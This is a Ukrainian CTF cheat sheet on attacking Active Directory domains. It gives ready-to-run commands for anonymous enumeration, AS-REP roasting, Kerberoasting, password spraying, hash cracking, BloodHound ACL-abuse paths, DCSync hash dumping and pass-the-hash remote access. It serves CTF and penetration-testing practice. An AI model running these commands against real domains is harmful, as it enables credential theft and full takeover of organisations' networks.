# Windows: Active Directory (CTF-рівень)

**Навіщо:** якщо ціль — домен (порти **88**+**389**), шлях майже завжди: один доменний креденшл → граф BloodHound → ланцюг (Kerberoast / AS-REP / ACL abuse / вкладені групи) → **Domain Admin** → DCSync. Тут — практичний набір, не курс адміністрування.
**Коли:** nmap показав 88 (Kerberos) + 389/636 (LDAP); або enum показав домен.
← [README](README.md) · [fundamentals](00-fundamentals.md#6-kerberos-домен) · [credentials](04-credentials.md) · [lateral](06-lateral-postex.md)

> **Передумови (Kali):** `impacket-*`, `netexec`/`nxc`, `bloodhound`+`bloodhound-python`, `ldapsearch`, `evil-winrm`.
> **Годинник!** Kerberos чутливий до розбіжності часу: `KRB_AP_ERR_SKEW` — часта причина «не працює». Синхронізуй з DC:
> - `sudo rdate -n <DC-IP>` — найнадійніше на свіжій Kali;
> - `sudo ntpdate <DC-IP>` — класика, але **на нових Kali пакета часто немає** (`sudo apt install ntpdate`);
> - перед ручним set: `sudo timedatectl set-ntp off`, виставити час, після — повернути `set-ntp on`;
> - без зміни системного часу: обгортка `faketime` навколо impacket-команди.
> Перевірити розбіжність: `nxc smb <DC-IP>` показує час хоста в баннері — порівняй зі своїм `date`.

---

## 0. Базові змінні
```bash
DC=10.0.N0.10 ; DOMAIN=corp.local ; DCHOST=dc01.corp.local
# додати в /etc/hosts:  <DC>  corp.local dc01.corp.local dc01
```

<a id="ldap-enumeration"></a>
## 1. Enum без кредів (LDAP / RPC / SMB)
```bash
# хто це / ім'я домену
netexec smb $DC                                   # домен, ім'я DC, ОС
enum4linux-ng -A $DC
# anonymous LDAP (базовий контекст + інколи все дерево)
ldapsearch -x -H ldap://$DC -s base namingcontexts
ldapsearch -x -H ldap://$DC -b "DC=corp,DC=local" '(objectClass=user)' sAMAccountName | grep sAMAccountName
# RPC null
rpcclient -U '' -N $DC -c 'enumdomusers;enumdomgroups;querydominfo'
# список юзерів через RID-brute (коли enum закритий)
netexec smb $DC -u guest -p '' --rid-brute
```
**Інтерпретація:** здобув **список sAMAccountName** → можна: (а) AS-REP roast без пароля, (б) password spraying, (в) далі enum з першим кредом.
**Обмеження:** сучасні домени закривають anonymous LDAP/null RPC — тоді потрібен бодай один креденшл (з веба, шар, guest).

## 2. AS-REP Roasting (працює БЕЗ пароля) <a id="as-rep-roasting"></a>
**Коли:** є список юзерів; шукаємо тих, у кого вимкнено Kerberos pre-auth (`DONT_REQ_PREAUTH`).
```bash
# без кредів — по списку юзерів:
impacket-GetNPUsers $DOMAIN/ -usersfile users.txt -dc-ip $DC -no-pass -request -format hashcat -outputfile asrep.txt
# з кредами — автоматично знайде вразливих:
netexec ldap $DC -u <user> -p <pass> --asreproast asrep.txt
```
**Далі:** `hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt` → пароль юзера.
**Приклад:** HTB **Sauna/Forest** — AS-REP-roastable юзер дає перший доменний пароль.
**Обмеження:** працює лише якщо є хоч один юзер із вимкненим preauth; інакше порожньо — йди на spraying/інший foothold.

## 3. Отримати перший креденшл (якщо ще нема)
```bash
# password spraying знайденим/типовим паролем (ОБЕРЕЖНО з lockout — net accounts показує політику)
netexec smb $DC -u users.txt -p '<OnePassword>' --continue-on-success
# перевірка валідності пари
netexec smb $DC -u <user> -p <pass>        # [+] = валідно
```
> **Правила:** без флуду/брутфорсу платформи. Spraying — **один** пароль по юзерах, не словник по одному юзеру; стеж за `net accounts` (lockout threshold).

## 4. Kerberoasting (потрібен будь-який доменний креденшл) <a id="kerberoasting"></a>
**Коли:** є валідний доменний юзер; шукаємо сервіс-акаунти зі SPN (їх TGS шифрується хешем їх пароля).
```bash
impacket-GetUserSPNs $DOMAIN/<user>:<pass> -dc-ip $DC -request -outputfile kerb.txt
# або:
netexec ldap $DC -u <user> -p <pass> --kerberoasting kerb.txt
```
**Крек:** <a id="крек-кербероста"></a>
```bash
hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt
```
**Інтерпретація/далі:** зламаний пароль сервіс-акаунта часто має високі права (інколи прямо в адмінах/DA) → [lateral](06-lateral-postex.md) або DCSync.
**Приклад:** HTB **Active** — Kerberoast сервіс-акаунта `Administrator`-рівня після GPP-foothold.
**Обмеження:** якщо пароль сервіс-акаунта стійкий — не зламається; не єдиний шлях, дивись BloodHound.

## 5. BloodHound — граф шляхів до DA ⭐
**Коли:** є будь-який доменний креденшл. Головний інструмент — показує найкоротший шлях атаки.

> **Узгодь версії.** У репо — **SharpHound 2.x** ([tools/windows](../tools/README.md)), він збирає дані у форматі **BloodHound CE** (не legacy). Нижче — CE-флоу. Для **legacy** BloodHound (стара GUI на neo4j) потрібен колектор SharpHound **1.x** і python-збирач `bloodhound-python` — тоді запуск інший (`sudo neo4j start; bloodhound`). Збирай тим, що відповідає твоєму BloodHound на Kali.

**Крок 1 — збір даних (→ .zip):**
```bash
# А) з Windows-хоста (SharpHound 2.x з tools/windows/):
SharpHound.exe -c All                 # або через .ps1:  Import-Module .\SharpHound.ps1 ; Invoke-BloodHound -CollectionMethod All
# Б) з Kali без бінаря на цілі (CE-сумісний збирач; pip-пакет `bloodhound-ce`):
bloodhound-ce-python -u <user> -p <pass> -d $DOMAIN -ns $DC -c All --zip
#   (legacy `bloodhound-python` дає .json лише під legacy-BloodHound; для CE — саме `bloodhound-ce-python`)
```
**Крок 2 — запуск BloodHound CE (веб) на Kali:**
```bash
# CE піднімається в Docker; за наявності — через bloodhound-cli:
bloodhound-cli install        # перший раз (качає образи; офлайн — заздалегідь)
bloodhound-cli up             # підняти; UI на http://localhost:8080/ui/login (логін admin)
#   первинний пароль admin друкується у виводі `install`; загубив → `bloodhound-cli resetpwd`
```
**Крок 3 — імпорт:** у веб-UI → **Administration → File Ingest → Upload** → віддати зібраний `.zip` (почекати, поки статус = Complete).
**Крок 4 — аналіз:** знайти свій node (пошук зверху) → **Mark as Owned**; потім вкладка **Cypher** або пресет **"Shortest Paths to Domain Admins"** / **"Shortest Paths from Owned"**.
> Офлайн-нюанс: CE тягне docker-образи з інтернету — підняти/закешувати **до гри** ([pre-game](../00-setup/pre-game-checklist.md)). Якщо CE недоступний офлайн, а є лише legacy-GUI — збирай `bloodhound-python`/SharpHound 1.x і працюй у legacy.

**Інтерпретація:** у графі шукай ребра: `MemberOf`, `AdminTo`, `GenericAll`/`GenericWrite`/`WriteDacl` (ACL abuse), `ForceChangePassword`, `AllowedToDelegate`.
**Що далі залежно від ребра:**
| Ребро | Дія |
|---|---|
| `GenericAll`/`WriteDacl` на юзера | скинути пароль: `net rpc password` / `bloodyAD` / targeted Kerberoast |
| `GenericAll` на групу | додати себе в групу (`net group "<grp>" <me> /add /domain`) |
| `ForceChangePassword` | `impacket-changepasswd` або `rpcclient setuserinfo2` |
| `AdminTo` | PtH/psexec на той хост → [lateral](06-lateral-postex.md) |
| `AllowedToDelegate`/RBCD | constrained/resource-based delegation (складніше) |
**Обмеження/версії:** **SharpHound 2.x (у репо) + BloodHound CE** — одна пара; **SharpHound 1.x + legacy BloodHound** — інша. Збирай колектором, що відповідає твоєму BloodHound на Kali. `bloodhound-python` простіший (не треба бінар на цілі).

## 6. DCSync (фінал — дамп усіх доменних хешів)
**Коли:** здобуто права реплікації (Domain Admin, або `DS-Replication-Get-Changes` через ACL).
```bash
impacket-secretsdump $DOMAIN/<user>:<pass>@$DC -just-dc
impacket-secretsdump $DOMAIN/<user>@$DC -hashes :<NThash> -just-dc-user Administrator
```
**Інтерпретація:** отримаєш NT-хеш `krbtgt` (→ Golden Ticket, поза CTF-рівнем зазвичай) і всіх юзерів → PtH куди завгодно.
**Обмеження:** потрібні реплікаційні права; це вже після компрометації DA/еквівалента.

## 7. Доступ під доменним акаунтом
```bash
evil-winrm -i $TARGET -u <user> -p <pass>              # 5985 (група Remote Management Users)
evil-winrm -i $TARGET -u <user> -H <NThash>            # PtH
impacket-psexec $DOMAIN/<user>:<pass>@$TARGET          # SYSTEM через ADMIN$ (гучно)
impacket-wmiexec $DOMAIN/<user>:<pass>@$TARGET         # тихіше за psexec
xfreerdp /d:$DOMAIN /u:<user> /p:<pass> /v:$TARGET /cert:ignore
```

## Типові AD-misconfig (що шукати)
- AS-REP-roastable юзери (preauth off) · Kerberoastable сервіс-акаунти зі слабким паролем.
- GPP `cpassword` у SYSVOL ([credentials](04-credentials.md), [privesc](03-privesc.md#7-креди-як-шлях-до-privesc-gpp--autologon--конфіги)).
- Небезпечні ACL (GenericAll/WriteDacl) — знаходить BloodHound.
- Паролі в описах юзерів (`description`), у шарах, у `web.config`.
- Вкладені групи (юзер → група → локальний адмін на хості).

## Джерела
- HackTricks — Active Directory Methodology: https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/index.html
- HackTricks — Kerberoast: https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/kerberoast.html · AS-REP: https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/asreproast.html
- BloodHound CE docs: https://bloodhound.specterops.io/ · SharpHound: https://github.com/SpecterOps/SharpHound
- impacket: https://github.com/fortra/impacket · The Hacker Recipes (AD): https://www.thehacker.recipes/
